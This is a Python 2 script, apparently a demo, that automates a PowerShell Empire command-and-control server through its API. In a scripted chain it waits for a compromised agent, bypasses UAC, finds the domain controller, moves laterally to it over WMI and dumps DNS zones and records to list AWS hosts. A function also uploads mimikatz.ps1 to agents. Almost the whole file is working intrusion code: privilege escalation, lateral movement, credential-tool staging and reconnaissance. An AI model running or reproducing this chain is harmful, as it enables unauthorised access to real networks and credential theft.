# written by @mohlcyber
import sys
import requests
import json
import time
import base64
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def login(ip, headers, user, pw, verify):
    res = requests.post('https://%s:1337/api/admin/login' % ip, headers=headers, \
        json={"username":user,"password":pw}, verify=verify)

    if res.status_code == 200:
        res = res.json()['token']
    else:
        print 'Something went wrong... (Authentication Failed) - Error Code %s' % res.status_code
        sys.exit(1)
    return res

def get_listeners(ip, headers, token, verify):
    res = requests.get('https://%s:1337/api/listeners' % ip, headers=headers, \
        params={'token': token}, verify=verify)
    res = res.json()
    return res

def get_agents(ip, headers, token, verify):
    res = requests.get('https://%s:1337/api/agents' % ip, headers=headers, \
        params={'token': token}, verify=verify)
    res = res.json()
    return res

def exec_module(ip, headers, token, agent, module, payload, verify):
    res = requests.post('https://%s:1337/api/modules/%s' % (ip,module), headers=headers, \
        params={'token': token}, json=payload, verify=verify)

    if res.status_code == 200:
        res = res.json()
        taskid = res['taskID']
        return taskid

def exec_module_with_results(ip, headers, token, agent, module, payload, verify):
    taskid = exec_module(ip, headers, token, agent, module, payload, verify)
    while True:
        results = get_agent_result(ip, headers, token, agent, verify)
        done = False
        for result in results['results']:
            if len(result) > 0:
                for entry in result['AgentResults']:
                    if entry['taskID'] == taskid:
                        if 'completed' in entry['results']:
                            done = True

                        if done == True:
                            return entry['results']

                        #return entry['results']
        time.sleep(2)

def get_agent_result(ip, headers, token, agent, verify):
    res = requests.get('https://%s:1337/api/agents/%s/results' % (ip, agent), headers=headers, \
        params={'token': token}, verify=verify)
    res = res.json()
    return res

def upload_file(ip, headers, token, agent, verify):
    with open('/root/Desktop/scripts/mimikatz.ps1', 'rb') as data:
        encoded_string = base64.b64encode(data.read())

    filename = 'mimikatz.ps1'
    file = {'filename': filename,
            'data': encoded_string}

    res = requests.post('https://%s:1337/api/agents/%s/upload' % (ip, agent), headers=headers, \
        params={'token': token}, json=file, verify=verify)
    return res

def exec_shell(ip, headers, token, agent, payload, verify):
    res = requests.post('https://%s:1337/api/agents/%s/shell' % (ip, agent), headers=headers, \
        params={'token': token}, json=payload, verify=verify)
    if res.status_code == 200:
        res = res.json()
        taskid = res['taskID']
        return taskid

def exec_shell_result(ip, headers, token, agent, payload, verify):
    taskid = exec_shell(ip, headers, token, agent, payload, verify)
    while True:
        results = get_agent_result(ip, headers, token, agent, verify)
        done = False
        for result in results['results']:
            if len(result) > 0:
                for entry in result['AgentResults']:
                    if entry['taskID'] == taskid:
                        if 'completed' in entry['results']:
                            done = True

                        if done == True:
                            return entry['results']
        time.sleep(5)

if __name__ == "__main__":

    ip = 'empire ip'
    user = 'username'
    pw = 'password'
    verify = False

    headers = {'Content-Type': 'application/json'}

    token = login(ip, headers, user, pw, verify)
    list = get_listeners(ip, headers, token, verify)

    print '-------------------------------\n'
    for listeners in list['listeners']:
        name = listeners['name']
        if name == 'https':
            print '### %s listener is started and waiting for agents \n' % name
        else:
            print '### %s listener is not started, please start the listener \n' % name

    print '### waiting for agents to connect \n'
    print '-------------------------------\n'
    while True:
        agents = get_agents(ip, headers, token, verify)
        if not agents['agents']:
            time.sleep(5)
            pass
        else:
            for agent in agents['agents']:
                name = agent['name']
                hostname = agent['hostname']
                internal_ip = agent['internal_ip']
                print '### Awesome a new agent connected to our listener with the name %s (%s, %s) \n' % (name, hostname, internal_ip)
            break

    raw_input('Press Enter to continue...')
    print '-------------------------------\n'

    print '### I will try to bypass the User Access Control (UAC) \n'
    module = 'powershell/privesc/bypassuac_env'
    payload = {'Agent': name,
               'Listener': 'https'}
    result = exec_module(ip, headers, token, name, module, payload, verify)

    found = 0
    while True:
        agents = get_agents(ip, headers, token, verify)
        for agent in agents['agents']:
            if agent['name'] <> name and agent['internal_ip'] == internal_ip:
                name2 = agent['name']
                hostname2 = agent['hostname']
                internal_ip2 = agent['internal_ip']
                found = 1
                print '### Great the client connected with bypassed UAC with the name %s (%s, %s) \n' % (name2, hostname2, internal_ip2)
        if found == 1:
            break
        time.sleep(5)

    print '### Connecting to the new client %s \n' % name2
    raw_input('Press enter to find out the DNS server...')
    print '-------------------------------\n'
    module = 'powershell/situational_awareness/network/powerview/get_domain_controller'
    payload = {'Agent': name2}
    result = exec_module_with_results(ip, headers, token, name2, module, payload, verify)

    dnsip1 = re.findall('(?:[0-9]{1,3}\.){3}[0-9]{1,3}', result)[0]

    print '### I found the following DNS server. DNS server IPs is / are %s \n' % dnsip1
    raw_input('Press enter to lateral move to the DNS %s ...' % dnsip1)
    print '-------------------------------\n'

    module = 'powershell/lateral_movement/invoke_wmi'
    payload = {'Agent': name2,
               'Listener': 'https',
               'ComputerName': dnsip1}
    result = exec_module(ip, headers, token, name2, module, payload, verify)

    found = 0
    while True:
        agents = get_agents(ip, headers, token, verify)
        for agent in agents['agents']:
            if agent['name'] <> name2 and agent['internal_ip'] == dnsip1:
                dns_name = agent['name']
                dns_hostname = agent['hostname']
                dns_ip = agent['internal_ip']
                found = 1
                print '### Great we moved to the DNS server with the name %s (%s, %s) \n' % (dns_name, dns_hostname, dns_ip)
        if found == 1:
            break
        time.sleep(10)

    print '### Connecting to the DNS server %s \n' % dns_name
    raw_input('Press enter to receive the DNS zones...')
    print '-------------------------------\n'

    payload = {'command': 'shell powershell Get-DNSServerZone'}
    result = exec_shell_result(ip, headers, token, dns_name, payload, verify)
    print result
    print '\n'

    raw_input('Press enter to receive the DNS records...')
    print '-------------------------------\n'

    payload = {'command': 'shell powershell Get-DNSServerResourceRecord mcafee-ebc.com'}
    result = exec_shell_result(ip, headers, token, dns_name, payload, verify)
    print result
    print '\n'

    aws = re.findall('(?:aws\x2d\w+|AWS\x2d\w+)', result)
    awscount = len(aws)

    print '### I found %d AWS cloud systems: %s, %s, %s, %s, %s \n' % (awscount, aws[0], aws[1], aws[2], aws[3], aws[4])
    print '-------------------------------\n'
